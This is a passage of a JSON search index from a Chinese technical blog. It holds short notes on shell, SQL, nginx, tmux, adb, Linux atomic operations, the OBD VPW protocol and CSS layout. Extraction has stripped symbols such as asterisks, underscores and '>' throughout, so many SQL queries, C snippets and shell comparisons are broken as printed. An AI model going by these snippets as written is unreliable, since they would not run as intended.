时为真（字符匹配）\n\n!= 不等于 if [ \"$a\" != \"$b\" ]\n在 [[ ... ]] 结构中会进行模式匹配。\n \u003c 小于，按照 ASCII码 排序。\n\nif [[ \"$a\" \u003c \"$b\" ]]\nif [ \"$a\" \\\u003c \"$b\" ]\n\n注意在 [] 结构里 \u003c 需要被 转义。\n\n大于，按照 ASCII 码排序。\n\nif [[ \"$a\"   \"$b\" ]]\nif [ \"$a\" \\  \"$b\" ]\n\n注意在 [] 结构里   需要被转义。\n\n -z 字符串为空，即字符串长度为0。\n\nString=''   # 长度为0的字符串变量。\n\nif [ -z \"$String\" ]\nthen\n  echo \"\\$String is null.\"\nelse\n  echo \"\\$String is NOT null.\"\nfi     # $String is null.\n\n-n 字符串非空（null）使用 -n 时字符串必须是在括号中且被引用的。\n使用 ! -z 判断未引用的字符串或者直接判断（样例 7-6）通常可行，但是非常危险。判断字符串时一定要引用1。","tags":null},{"location":"//blog.pytool.com/Post/nginx/2016-01-01 Linux命令 nginx 配置.json文件直接访问，不下载","title":"Linux命令 Nginx列出目录 autoindex","text":"配置：  conf/mime.types\n\ntext/plain   txt;  =  text/plain   txt json;","tags":null},{"location":"//blog.pytool.com/Post/数据库/2017-04-01 sqlite3","title":"sqlite3","text":"创建数据库\n\nsqlite3 ./phalcontest.sqlite \u003c \"schemas/sqlite/phalcontest.sql\"\n\n 打开或创建\n\nsqlite3 ./phalcontest.sqlite\n格式化输出\n.header on\n.mode column\n.timer on\n\n 显示数据库结构\n\n.databases\n.tables\n.schema      #显示所有字段结构\n.schema 表名 #显示指定字段结构\n\n查询\n.tables\n.schema  builds\ndelete from builds where buildid = 72;\nselect * from builds where build_id = 72;  修复drone\n\n退出\n\n.quit\n.exit\n`","tags":null},{"location":"//blog.pytool.com/Post/shell/2017-11-07 shell特殊字符","title":"shell特殊字符","text":"Shell特殊字符\n\n下面来看看Shell特殊字符。\n双引号\"：用来使Shell无法认出除字符$、`、\\之外的任何字符或字符串，也称之为弱引用。\n\n单引号'：用来使Shell无法认出所有的特殊字符，也称之为强引用。\n\n反引号`：优先执行当前命令。\n\n反斜杠\\：有两种作用，一种是用来使Shell无法认出其后的字符，使其后的字符失去特殊的含义，如有特殊含义的字符$，也称为转义符。\n另外，如果放在指令前，有取消别名的作用，例如在“\\rm/home/yhc/.log”中，rm指令前加上\\，作用是暂时取消别名的功能，将rm指令还原。\n\n分号； ：允许在一行上放多个命令。\n\n\u0026     ：将命令放于后台执行，建议带上nohup。\n\n括号() ：创建成组的命令。  新开shell子进程\n\n大括号{}：创建命令块。\n\n\u0026    ：重定向。\n\n? [] !：表示模式匹配。\n\n$      ：变量名的开头。\n\n：表示注释（第一行除外）。\n\n空格、制表符、换行符：当作空白。\n`","tags":null},{"location":"//blog.pytool.com/Post/前端技术/CSS/2016-11-09 scss","title":"scss","text":"SASS中文网\n\nlibsass\nInstall\ngem install sass\n\ngem install scsslint\n\n 配置\nscss-lint . --config .scss-lint.yml\n\nscss-lint . --exclude ./nodemodules/*/\nscss-lint ./assets/stylesheets\nlibsass\ngosass","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/unicode","title":"golang 中unicode包用法","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/Other/2016-12-12 项目管理","title":"开源书籍","text":"计划\n  \n  \n讨论\n进行\n   DONE 会员卡核销过程不直观，核销卡券在店铺流水中未体现\n  * 增加文字提示 （赠送 xx 元）或（减免 xx 元）","tags":null},{"location":"//blog.pytool.com/Post/数据库/2017-04-24 mysql查询当月当天数据","title":"mysql 查询当天、本周，本月，上一个月的数据","text":"今天\n\nselect  from 表名 where todays(时间字段名) = todays(now());\n\n昨天\n\nSELECT  FROM 表名 WHERE TODAYS( NOW( ) ) - TODAYS( 时间字段名) \u003c= 1\n\n近7天\n\nSELECT  FROM 表名 where DATESUB(CURDATE(), INTERVAL 7 DAY) \u003c= date(时间字段名)\n\n近30天\n\nSELECT  FROM 表名 where DATESUB(CURDATE(), INTERVAL 30 DAY) \u003c= date(时间字段名)\n\n本月\n\nSELECT  FROM 表名 WHERE DATEFORMAT( 时间字段名, '%Y%m' ) = DATEFORMAT( CURDATE( ) , '%Y%m' )\n\n上一月\n\nSELECT  FROM 表名 WHERE PERIODDIFF( dateformat( now( ) , '%Y%m' ) , dateformat( 时间字段名, '%Y%m' ) ) =1\n\n查询本季度数据\n\nselect  from htinvoiceinformation where QUARTER(createdate)=QUARTER(now());\n\n查询上季度数据\n\nselect  from htinvoiceinformation where QUARTER(createdate)=QUARTER(DATESUB(now(),interval 1 QUARTER));\n\n查询本年数据\n\nselect  from htinvoiceinformation where YEAR(createdate)=YEAR(NOW());\n\n查询上年数据\n\nselect  from htinvoiceinformation where year(createdate)=year(datesub(now(),interval 1 year));\n\n查询当前这周的数据\n\nSELECT name,submittime FROM enterprise WHERE YEARWEEK(dateformat(submittime,'%Y-%m-%d')) = YEARWEEK(now());\n\n查询上周的数据\n\nSELECT name,submittime FROM enterprise WHERE YEARWEEK(dateformat(submittime,'%Y-%m-%d')) = YEARWEEK(now())-1;\n\n查询上个月的数据\n复制代码\n\nselect name,submittime from enterprise where dateformat(submittime,'%Y-%m')=dateformat(DATESUB(curdate(), INTERVAL 1 MONTH),'%Y-%m')\n\nselect  from user where DATEFORMAT(pudate,'%Y%m') = DATEFORMAT(CURDATE(),'%Y%m') ;\n\nselect  from user where WEEKOFYEAR(FROMUNIXTIME(pudate,'%y-%m-%d')) = WEEKOFYEAR(now())\n\nselect  from user where MONTH(FROMUNIXTIME(pudate,'%y-%m-%d')) = MONTH(now())\n\nselect  from user where YEAR(FROMUNIXTIME(pudate,'%y-%m-%d')) = YEAR(now()) and MONTH(FROMUNIXTIME(pudate,'%y-%m-%d')) = MONTH(now())\n\nselect * from user where pudate between  上月最后一天  and 下月第一天\n\n复制代码\n\n查询当前月份的数据\n\nselect name,submittime from enterprise   where dateformat(submittime,'%Y-%m')=dateformat(now(),'%Y-%m')\n\n查询距离当前现在6个月的数据\n\nselect name,submittime from enterprise where submittime between date_sub(now(),interval 6 month) and now();","tags":null},{"location":"//blog.pytool.com/Post/resin/2016-01-01 Linux命令 resin","title":"Linux命令 resin","text":"sed -i \\\n\t\t-e 's|${resin.root}/doc/resin-doc|webapps/resin-doc|' \\\n\t\t-e 's|${resin.root}/doc/admin|webapps/admin' \\\n\n     \"${D}/etc/resin/resin.xml\"","tags":null},{"location":"//blog.pytool.com/Post/2016-06-01 Linux命令 ELK","title":"elk","text":"ELK+Filebeat 集中式日志解决方案详解\n百度假蜘蛛\n^(117\\.28\\.255|119\\.63\\.196|121\\.10\\.141|121\\.14\\.89|124\\.248\\.34|125\\.39\\.78|125\\.90\\.88|159\\.226\\.50|180\\.76\\.5|203\\.208\\.60|210\\.72\\.225|222\\.77\\.187|123\\.125\\.[0-9]{1,3}|180\\.149\\.[0-9]{1,3}|220\\.181\\.[0-9]{1,3}|61\\.135\\.[0-9]{1,3}|60\\.191\\.[0-9]{1,3})\\.[0-9]{1,3}$\n\n`","tags":null},{"location":"//blog.pytool.com/Hardware/车联网/2017-02-04 VPW协议解析","title":"VPW协议解析","text":"SAE J1850 VPW协议也是OBD II标准中的一种，通常应用于GM车系中。VPW英文全称是Variable Pulse Width Modulated，即可变脉宽调制。下面从物理层特性、电平接口、帧结构、命令交互、交互时间参数、常用命令字等几个方面来介绍这种协议。\nØ  物理层特性：\n采用10.4KB/S的波特率；通讯电平通常为7.5V；每个字节采用8位二进制数形式，没有起始位、停止位和校验位；通讯引脚为J1850 BUS+，既为OBD-2PIN。\nØ  电平接口：\n协议通讯采用10.4Kbps VPW方式，初始电平为0V，在第1帧数据前有一个163至239微秒（us）的高电平表示SOF（帧头即数据开始标志），接下来以不同长短的高低电平表示二进制数据0或1，其中：\n高电平宽度介于34-96us表示“1”，高电平宽度介于96-163us表示“0”，\n低电平宽度介于34-96us表示“0”，低电平宽度介于96-163us表示“1”，\n传输时按字节顺序，且每个字节都是高位在前，低位在后的顺序，高低电平相间用于表示传输的数据，字节与字节之间没有间隔，传送完一帧数据之后有一个宽度大于239us的低电平表示EOF（帧尾即帧结束标志）。\nØ  帧结构：\nGM车型中的帧结构：\nTools: 0x6C + ECU地址 + 设备地址 + FunID + (command information) + CRC\nECU:   0x6C + 设备地址 + ECU地址 + FunID + (command information) + CRC\nOBDII中的帧结构：\nTools: 0x68 + 0x6A + ECU地址 + FunID + (command information) + CRC\nECU:   0x48 + 0x6B + 设备地址 + FunID + (command information) + CRC\nECU地址为每个系统的标示号，设备地址一般为0xF1或0xF0；而FunID为不同功能的标示号，ECU响应的FunID在tools命令的基础上+0x40；CRC（循环冗余校验）为校验字节。\nØ  命令交互:命令交互通常情况下为1对1，但也存在1对多或者多对1的情况。下面是两组命令交互举例：\n    GM:\nTools: 6CH 10H F1H 20H 64H\nECU:   6CH F1H 10H 60H 72H\nOBDII:\nTools: 68H 6AH F1H 01H 00H 17H\nECU:   48H 6BH 10H 41H 00H BEH 3FH B8H 10H C9H\n在交互中，因为发送命令的对象不一样，所以目标地址和源地址是进行了互换；同时，ECU响应设备的命令字在设备命令字的基础上+0x40\nØ  交互时间参数：\n设备发出命令后到ECU应答命令的时间间隔为320微秒(us)到100毫秒（ms）。\nECU应答命令后到设备发下一条命令的时间间隔为320微秒(us)到100ms。\n如果设备或ECU同时发送多帧命令时，每帧之间的时间间隔为3到5ms。\n同一帧命令中的字节与字节之间无时间间隔。\nØ  常用命令字：\nGM车型中的常用命令字：\n系统进入：20H\n数据流设置：2CH\n数据流读取：2AH\n读故障码：19HH\n清除故障码：14H\n读版本信息：3CH\nOBD II中常用命令字：\n读数据流：01H\n读故障码：03H\n清除故障码：04H\n读版本信息：09H","tags":null},{"location":"//blog.pytool.com/Hardware/Android 底层/2016-01-02 Linux内核 同步机制","title":"Linux原子操作与同步机制","text":"0x01 并发问题\n现代操作系统支持多任务的并发，并发在提高计算资源利用率的同时也带来了资源竞争的问题。例如C语言语句“count++;”在未经编译器优化时生成的汇编代码为。\n\n当操作系统内存在多个进程同时执行这段代码时，就可能带来并发问题。\n\n假设count变量初始值为0。进程1执行完“mov eax, [count]”后，寄存器eax内保存了count的值0。此时，进程2被调度执行，抢占了进程1的CPU的控制权。进程2执行“count++;”的汇编代码，将累加后的count值1写回到内存。然后，进程1再次被调度执行，CPU控制权回到进程1。进程1接着执行，计算count的累加值仍为1，写回到内存。虽然进程1和进程2执行了两次“count++;”操作，但是count实际的内存值为1，而不是2！\n 0x02 单处理器原子操作\n解决这个问题的方法是，将“count++;”语句翻译为单指令操作。\n\nIntel x86指令集支持内存操作数的inc操作，这样“count++;”操作可以在一条指令内完成。因为进程的上下文切换是在总是在一条指令执行完成后，所以不会出现上述的并发问题。对于单处理器来说，一条处理器指令就是一个原子操作。\n0x03 多处理器原子操作\n但是在多处理器的环境下，例如SMP架构，这个结论不再成立。我们知道“inc [count]”指令的执行过程分为三步：\n1）从内存将count的数据读取到cpu。\n2）累加读取的值。\n3）将修改的值写回count内存。\n这又回到前面并发问题类似的情况，只不过此时并发的主题不再是进程，而是处理器。\nIntel x86指令集提供了指令前缀lock用于锁定前端串行总线（FSB），保证了指令执行时不会受到其他处理器的干扰。\n\n使用lock指令前缀后，处理器间对count内存的并发访问（读/写）被禁止，从而保证了指令的原子性。\n\n 0x04 x86原子操作实现\nLinux的源码中x86体系结构原子操作的定义文件为。\nlinux2.6/include/asm-i386/atomic.h\n文件内定义了原子类型atomict，其仅有一个字段counter，用于保存32位的数据。\ntypedef struct { volatile int counter; } atomict;\n其中原子操作函数atomicinc完成自加原子操作。\n/*\n atomicinc - increment atomic variable\n @v: pointer of type atomict\n  Atomically increments @v by 1.\n /\nstatic inline void atomicinc(atomict v)\n{\n    asm volatile(\n       LOCK \"incl %0\"\n       :\"=m\" (v-  counter)\n       :\"m\" (v-  counter));\n}\n其中LOCK宏的定义为。\nifdef CONFIGSMP\n    define LOCK \"lock ; \"\nelse\n    define LOCK \"\"\nendif\n可见，在对称多处理器架构的情况下，LOCK被解释为指令前缀lock。而对于单处理器架构，LOCK不包含任何内容。\n 0x05 arm原子操作实现\n在arm的指令集中，不存在指令前缀lock，那如何完成原子操作呢？\nLinux的源码中arm体系结构原子操作的定义文件为。\nlinux2.6/include/asm-arm/atomic.h\n其中自加原子操作由函数atomicaddreturn实现。\nstatic inline int atomicaddreturn(int i, atomict v)\n{\n    unsigned long tmp;\n    int result;\n    asm volatile(\"@ atomicaddreturn\\n\"\n       \"1:     ldrex   %0, [%2]\\n\"\n       \"       add     %0, %0, %3\\n\"\n       \"       strex   %1, %0, [%2]\\n\"\n       \"       teq     %1, #0\\n\"\n       \"       bne     1b\"\n       : \"=\u0026r\" (result), \"=\u0026r\" (tmp)\n       : \"r\" (\u0026v-  counter), \"Ir\" (i)\n       : \"cc\");\n    return result;\n}\n上述嵌入式汇编的实际形式为。\n1:\nldrex  [result], [v-  counter]\nadd    [result], [result], [i]\nstrex  [temp], [result], [v-  counter]\nteq    [temp], #0\nbne    1b\nldrex指令将v-  counter的值传送到result，并设置全局标记“Exclusive”。\nadd指令完成“result+i”的操作，并将加法结果保存到result。\nstrex指令首先检测全局标记“Exclusive”是否存在，如果存在，则将result的值写回counter-  v，并将temp置为0，清除“Exclusive”标记，否则直接将temp置为1结束。\nteq指令测试temp值是否为0。\nbne指令temp不等于0时跳转到标号1，其中字符b表示向后跳转。\n整体看来，上述汇编代码一直尝试完成“v-  counter+=i”的操作，直到temp为0时结束。\n使用ldrex和strex指令对是否可以保证add指令的原子性呢？假设两个进程并发执行“ldrex+add+strex”操作，当进程1执行ldrex后设定了全局标记“Exclusive”。此时切换到进程2，执行ldrex前全局标记“Exclusive”已经设定，ldrex执行后重复设定了该标记。然后执行add和strex指令，完成累加操作。再次切换回进程1，接着执行add指令，当执行strex指令时，由于“Exclusive”标记被进程2清除，因此不执行传送操作，将temp设置为1。后继teq指令测定temp不等于0，则跳转到起始位置重新执行，最终完成累加操作！可见ldrex和strex指令对可以保证进程间的同步。多处理器的情况与此相同，因为arm的原子操作只关心“Exclusive”标记，而不在乎前端串行总线是否加锁。\n在ARMv6之前，swp指令就是通过锁定总线的方式完成原子的数据交换，但是影响系统性能。ARMv6之后，一般使用ldrex和strex指令对代替swp指令的功能。\n0x06 自旋锁中的原子操作\nLinux的源码中x86体系结构自旋锁的定义文件为。\nlinux2.6/include/asm-i386/spinlock.h\n其中rawspinlock完成自旋锁的加锁功能\ndefine rawspinlockstring \\\n    \"\\n1:\\t\" \\\n    \"lock ; decb %0\\n\\t\" \\\n    \"jns 3f\\n\" \\\n    \"2:\\t\" \\\n    \"rep;nop\\n\\t\" \\\n    \"cmpb $0,%0\\n\\t\" \\\n    \"jle 2b\\n\\t\" \\\n    \"jmp 1b\\n\" \\\n    \"3:\\n\\t\"\nstatic inline void _rawspinlock(rawspinlockt lock)\n{\n    asm volatile(\n       rawspinlockstring\n       :\"=m\" (lock-  slock) : : \"memory\");\n}\n上述代码的实际汇编形式为。\n1：\nlock   decb [lock-  slock]\njns    3\n2:\nrep    nop\ncmpb   $0, [lock-  slock]\njle    2\njmp    1\n3:\n其中lock-  slock字段初始值为1，执行原子操作decb后值为0。符号位为0，执行jns指令跳转到3，完成自旋锁的加锁。\n当再次申请自旋锁时，执行原子操作decb后lock-  slock值为-1。符号位为1，不执行jns指令。进入标签2，执行一组nop指令后比较lock-  slock是否小于等于0，如果小于等于0回到标签2进行循环（自旋）。否则跳转到标签1重新申请自旋锁，直到申请成功。\n自旋锁释放时会将lock-  slock设置为1，这样保证了其他进程可以获得自旋锁。\n0x07 信号量中的原子操作\nLinux的源码中x86体系结构自旋锁的定义文件为。\nlinux2.6/include/asm-i386/semaphore.h\n信号量的申请操作由函数down实现。\n/\n This is ugly, but we want the default case to fall through.\n \"_downfailed\" is a special asm handler that calls the C\n routine that actually waits. See arch/i386/kernel/semaphore.c\n /\nstatic inline void down(struct semaphore  sem)\n{\n    mightsleep();\n    asm volatile(\n       \" atomic down operation\\n\\t\"\n       LOCK \"decl %0\\n\\t\"     / --sem-  count /\n       \"js 2f\\n\"\n       \"1:\\n\"\n       LOCKSECTIONSTART(\"\")\n       \"2:\\tlea %0,%%eax\\n\\t\"\n       \"call downfailed\\n\\t\"\n       \"jmp 1b\\n\"\n       LOCKSECTIONEND\n       :\"=m\" (sem-  count)\n       :\n       :\"memory\",\"ax\");\n}\n实际的汇编代码形式为。\nlock   decl [sem-  count]\njs 2\n1:\n========== another section ==========\n2:\nlea    [sem-  count], eax\ncall   _downfailed\njmp 1\n信号量的sem-  count一般初始化为一个正整数，申请信号量时执行原子操作decl，将sem-  count减1。如果该值减为负数（符号位为1）则跳转到另一个段内的标签2，否则申请信号量成功。\n标签2被编译到另一个段内，进入标签2后，执行lea指令取出sem-  count的地址，放到eax寄存器作为参数，然后调用函数_downfailed表示信号量申请失败，进程加入等待队列。最后跳回标签1结束信号量申请。\n信号量的释放操作由函数up实现。\n/\n Note! This is subtle. We jump to wake people up only if\n the semaphore was negative (== somebody was waiting on it).\n The default case (no contention) will result in NO\n jumps for both down() and up().\n /\nstatic inline void up(struct semaphore  sem)\n{\n    asm volatile(\n       \"# atomic up operation\\n\\t\"\n       LOCK \"incl %0\\n\\t\"     / ++sem-  count /\n       \"jle 2f\\n\"\n       \"1:\\n\"\n       LOCKSECTIONSTART(\"\")\n       \"2:\\tlea %0,%%eax\\n\\t\"\n       \"call _upwakeup\\n\\t\"\n       \"jmp 1b\\n\"\n       LOCKSECTIONEND\n       \".subsection 0\\n\"\n       :\"=m\" (sem-  count)\n       :\n       :\"memory\",\"ax\");\n}\n实际的汇编代码形式为。\nlock   incl sem-  count\njle     2\n1:\n========== another section ==========\n2:\nlea    [sem-  count], eax\ncall   _upwakeup\njmp    1\n释放信号量时执行原子操作incl将sem-  count加1，如果该值小于等于0，则说明等待队列有阻塞的进程需要唤醒，跳转到标签2，否则信号量释放成功。\n标签2被编译到另一个段内，进入标签2后，执行lea指令取出sem-  count的地址，放到eax寄存器作为参数，然后调用函数_upwakeup唤醒等待队列的进程。最后跳回标签1结束信号量释放。\n\n0x09 总结\n本文通过对操作系统并发问题的讨论研究操作系统内的原子操作的实现原理，并讨论了不同体系结构下Linux原子操作的实现，最后描述了Linux操作系统如何利用原子操作实现常见的进程同步机制，希望对你有所帮助。","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 Tmux","title":"Tmux 速成教程","text":"Tmux 速成教程\nTmux - Linux从业者必备利器\ntmux attach #恢复上次会话\nctrl +b : 进入命令模式\nsetw -g mode-mouse on 开启鼠标滚屏\nset -g mouse on       # tmux   2.1\nsession 操作\ntmux new -s test 新建session，并命名为test\ntmux ls 列出所有session\nCtrl+b d - (d)eattch 当前session\ntmux attach [-t sessionname]重新进入某session\nCtrl+b $ - 重命名当前session\n\nwindow 操作\nCtrl+b c - (c)reate 生成一个新的窗口\nCtrl+b n - (n)ext 移动到下一个窗口\nCtrl+b p - (p)revious 移动到前一个窗口.\nCtrl+b w - 列出所有窗口编号,并进行选择切换.\nCtrl+b \u0026 - 确认后关闭当前window tmux\n\npane 操作\nCtrl+b \" - 将当前window水平划分\nCtrl+b % - 将当前window垂直划分\nCtrl+b 方向键 - 在各pane间切换\nCtrl+b，并且不要松开Ctrl，方向键 - 调整窗格大小\nCtrl+b x - 关闭当前pane\nCtrl+b { 或} - 左右pane 交换\nCtrl+b 空格键 - 采用下一个内置布局\nCtrl+b q - 显示pane的编号\nCtrl+b o - 跳到下一个pane\n\nvim ~/.tmux.conf\nunbind C-b\nset -g prefix C-a\n\n“ctrl-b [\" 进入拷贝模式，使用空格键（space）开始内容选取，回车键（Enter）进行拷贝\n\"ctrl-b ]” 进行粘贴。\nCTRL-b 光标键  切换窗口\nCTRL-b C-光标键 调整窗口大小\n\nCRTL-b \" 水平分割\nCRTL-b % 竖直分割\n\nCTRL-b 窗口号\nCTRL-b f\nCTRL-b w\nCTRL-b n（到达下一个窗口） CTRL-b p（到达上一个窗口）\nCTRL-b \u0026 退出  或者：exit\n\n    $ tmux new -s new session\n    $ top\n然后输入CTRL-b d从此会话脱离，想要重新连接此会话，需输入：\n    $ tmux attach-session -t session","tags":null},{"location":"//blog.pytool.com/Post/前端技术/2016-11-09 postcss","title":"postcss","text":"caniuse\n\nplugins\n\nwebpack 3 + postcss构建移动端网站架子 \napm install caniuse\n    can-i-use:show Show panel\n    can-i-use:update Update data\n\next install vscode-caniuse\n\nnpm install postcss-cli\n  postcss --use autoprefixer -c options.json -o screen.css screen.css\n\n什么是PostCSS？\n  PostCSS不是预处理器; 它不改变CSS。它本身并不完成css工作。它的作用是提供一个CSS解析器和创建可以分析，测试，处理资源，优化，创建回调，和传输给其它解析CSS框架的插件的框架。PostCSS把CSS解析成抽象语法树（AST），通过一系列的插件，然后重新编译成一个字符串。如果你熟悉JavaScript工具，那么可以把PostCSS类比为CSS的Babel。\n install\nnpm install -g postcss-cli\n\npostcss --help\n\n增加\nnpm install -g autoprefixer\n\n压缩\npostcss-clean","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 ack ag pt","title":"Linux命令 ack","text":"rg ripgrep is faster than {grep, ag, git grep, ucg, pt, sift}\r\n\r\npt\r\nIt searches code about 3–5× faster than ack.\r\nIt searches code as fast as thesilversearcher(ag).\r\n\r\ntime 统计时间\r\ngrep\r\ntime grep -r outofmemory \r\ntime grep outofmemory $(find . -type f | grep -v '\\.git')\r\n ack\r\ntime ack outofmemory\r\nag\r\ntime ag outofmemory\r\n\r\npt\r\nInstall\r\ngo get -u github.com/monochromegane/theplatinumsearcher/\r\ncurl  -O https://github.com/monochromegane/theplatinumsearcher/releases/download/v2.1.4/ptlinuxamd64.tar.gz\r\n使用\r\n$ # Recursively searchs for PATTERN in current directory.\r\n当前路径下搜索\r\n$ pt PATTERN\r\n\r\n$ # You can specified PATH and some OPTIONS.\r\n$ pt OPTIONS PATTERN PATH\r\n配置\r\nIf you put configuration file on the following directories, pt use option in the file.\r\n\r\n    $XDGCONFIGHOME/pt/config.toml\r\n    $HOME/.ptconfig.toml\r\n    .ptconfig.toml (current directory)\r\ncolor = true\r\ncontext = 3\r\nignore = [\"dir1\", \"dir2\"]\r\ncolor-path = \"1;34\"\r\nack的使用案例\r\n\r\n1.在当前目录递归搜索单词”eat”,不匹配类似于”feature”或”eating”的字符串:\r\n$ ack -w eat\r\n\r\n2.搜索有特殊字符的字符串’$path=.’,所有的元字符（比如’$',’.')需要在字面上被匹配:\r\n$ ack -Q '$path=.' /etc\r\n\r\n3.除了dowloads目录，在所有目录搜索”about”单词:\r\n$ ack about --ignore-dir=downloads\r\n\r\n4.只搜索包含’protected’单词的PHP文件，然后通过文件名把搜索结果整合在一起，打印每个文件对应的搜索结果:\r\n$ ack --php --group protected\r\n\r\n5.获取包含’CFLAG’关键字的Makefile的文件名。文件名为.mk,makefile,Makefile,GNUmakefile的都在考虑范围内:\r\n$ ack --make -l CFLAG\r\n\r\n6.显示整个日志文件时高亮匹配到的字符串:\r\n$ tail -f /var/log/syslog | ack --passthru 192.168.1.10\r\n\r\n7.要换取ack支持的文件过滤类型，运行：\r\n$ ack --help-type","tags":null},{"location":"//blog.pytool.com/Post/前端技术/Web技术/web技术第七弹 CSS盒子模型及布局应用","title":"web技术第七弹 CSS盒子模型及布局应用","text":"web技术第七弹 CSS盒子模型及布局应用\n\n       近日工作繁忙，更新速度稍慢，敬请谅解。闲话不说，就上一弹的CSS选择器话题，先供上一张总结图片供参考。\n\n       下面主要谈谈在CSS中的基本盒子模型。盒子，是页面中元素呈现的基本样式模型。是每一个元素标签在页面上的呈现。对应HTML中的块级元素和行内元素，那么有两类盒子，一类是块级元素的块级盒子：默认占据一行，可以指定显式的宽度和高度，每个盒子单独占一行后自动换行；另一类是行内元素的行内盒子，它不可指定宽度，自动包裹住内容宽度，并且在一行内并排显示，只有排列不下的情况下才会被“挤”到下一行，并不自动换行。大部分的标签元素的显示，都是块级盒子，少量如span、img是行内盒子。\n\n       那么，每个盒子具体是什么样子的，又有哪些基本CSS属性呢？下面是一个基本盒子的图样，以及对应的属性总结：\n\n       当涉及到外边距、边框、outline、内边距的属性书写的时候，会有简写的情况，这时候记住：\n1、数值一次性书写，其顺序是从top开始，顺时针表示 top、right、bottom、left。\n2、因为这些都是矩形，所以，如果对应的数值如果缺失，缺失的那一边就采用对面边的数值。如果只有一个数值，那就表示四个边都是同一个数值。\n        了解了页面元素的呈现都是一些盒子的排列，和具体盒子的属性设置，我们可以简单的看看一个页面是怎么布局的了。我们来看个实际的页面：\n\n       我们把这个页面来分析一下，可以看出这个页面是下面这几个大的盒子形成的。 简单而言，这有一个顶部固定的标题栏，然后下面是自动居中的WarpBOX包裹层，在这个里面有三个固定宽度的栏目。具体再到里面的盒子，还有各种不同的小盒子在里面。如何应用基本盒子的属性，完成这样的页面样式，这就是基本的页面布局。我们可以来分析下最基础的几种布局模型：​\n一、单列布局​\n        首先，我们对body元素予以内外边距都设定成0px，这样可以使页面紧贴浏览器窗口。然后我们设置一个mainWarp的大盒子作为内容包裹层，我们要使这个盒子实现左右居中的效果，可以对其的margin属性定义为0,auto； 。 这样，这个盒子就会上下贴住body，左右外边距由浏览器自动计算，实现居中的效果。\n二、双列布局\n       两个盒子，divLeft和divRight，都是块级盒子，默认情况下是按照标准文档流会上下排列的。我们需要对这两个盒子设定显式的宽度，然后让他们并排排列在一行，怎么实现呢？可以用元素的float和clear属性。首先，对需要并排排列的块级盒子应用float：left; 。设置后，盒子会从原先的文档流里脱离出来，沿着左边贴住父元素的可用最左边，同时他的后续元素不再换行，而是沿着同一行在可用处继续显示。为了使divDown这个盒子不被前一个浮动元素影响并排，对它实行clear:both; 属性清除浮动。由于之前的元素浮动脱离文档流，会导致背后的warp包裹层高度塌陷，因此再对它实行 Overflow：hidden; 的属性，解决这个问题。这样，就可以实现布局了。\n三、三列布局，左右宽度固定，中间宽度自适应布局\n       由于中间的盒子宽度不确定，因此无法用float的方式把他们并排显示。这种情况下，换个思路，可以用postion位移的方式来实现。首先，我们设定一个divWarp，并让这个作为绝对位移的基准位置，设定其Position：relative；，含义是这个盒子相对于自己的文档流位置不做偏移​。第二，对左边盒子divLeft做绝对位移，相对于divWarp，设定其Position：absolut;left 0;top 0; 使他左上角和基准盒子的左上角贴住。同样的道理，设定右边的盒子divRight的属性为 Position：absolute;right 0;top 0； 使他的右上角贴住基准点。这样，为中间的盒子留出左右空间分别为这两个盒子的固定宽度a和b。 最后，对中间的盒子外边距属性设定margin：0，b，0，a； 这样，就让中间的盒子自适应宽度而又单独成一列，完成我们需要的样式了。 注意，对于显式设定width的盒子，CSS的默认是内容的宽度，而页面上实际的宽度还需要加上边框和内外边距。为了在设定这些属性时，盒子的实际宽度不要发生变化导致布局混乱，我们最好对盒子实行box-sizing：border-box；，把width值统一到内容+边框+内边距上，避免因为这些样式的设定造成宽度不固定。\n       最后，我对CSS下盒子模型的学习和布局，做点总结如下：\n\nCSS中的基本盒子模型：块级盒子和行内盒子\n\n块级盒子：一行只有一个，可以显示指定宽度，自动换行\n行内盒子：行内排列，不能显示指定宽度，自动包裹内部元素，不换行\n\n两类通过 display:block 和inline 来互相切换\n盒子的外边距可以设为负值，用来实现内容的偏移\n\n块级盒子通过float属性和clear属性，以及position定位可以实现浮动横向排列的效果\n\n通过box-sizing：border-box; 属性，给块级盒子指定的固定宽度包含边框和内边距。\n\n典型应用：页面多列效果和各种菜单效果。\n\n            在CSS3里，对盒子模型做了更进一步的进化，对盒子的border有更多的新属性可以应用（如边框圆角应用、边框内图形填充等），以及针对浮动和偏移带来的布局不方便，重新定义了各类新的盒子，这些盒子根据布局和位置的不同有各种新的属性，极大的方便了页面布局的安排。下一弹会重点介绍CSS3中的升级版新盒子模型。","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 adb","title":"Linux命令 adb","text":"sudo apt-get install android-tools-adb\r\nsudo apt-get install android-tools-fastboot\r\n启动fastboot模式\r\nadb reboot bootloader  \r\n\r\n\r\n 查看手机上应用\r\nadb shell pm list packages\r\npm list packages -f 显示安装位置\r\n\r\n配置USB访问权限/etc/udev/rules.d/51-android.rules\r\nwget -S -O - http://source.android.com/source/51-android.rules | sed \"s/username/$USER/\" | sudo tee   /dev/null /etc/udev/rules.d/51-android.rules;\r\nsudo udevadm control --reload-rules\r\n一份超全超详细的 ADB 用法大全 - MengGang - CSDN博客\r\n\r\n\r\nbmgr是一个shell工具你可以用来与备份管理器在Android设备（支持API级别8或更高）。它提供了命令来指导的备份和恢复操作,这样你不需要反复清除数据或采取类似的侵入性的步骤来测试您的应用程序的备份代理。这些命令是通过adb shell。\r\n\r\n使用备份操作\r\n通常，应用程序必须通知备份管理器在它的数据已经改变。通过dataChanged()。备份管理器将调用您的备份代理的onBackup()实现在未来某个时刻。如果调用dataChanged()，可以调用一个备份请求从命令行运行bmgr备份命令。\r\n\r\n命令：\r\nadb shell bmgr backup package\r\n\r\n当您执行该备份命令,您的应用程序的备份代理将调用来执行备份操作在未来一段时间内(通过你的onBackup()方法),尽管没有保证当它会发生。然而,您可以强制执行所有没有运行的备份操作，通过使用bmgr运行命令:\r\n\r\n命令：\r\nAdb shell bmgr 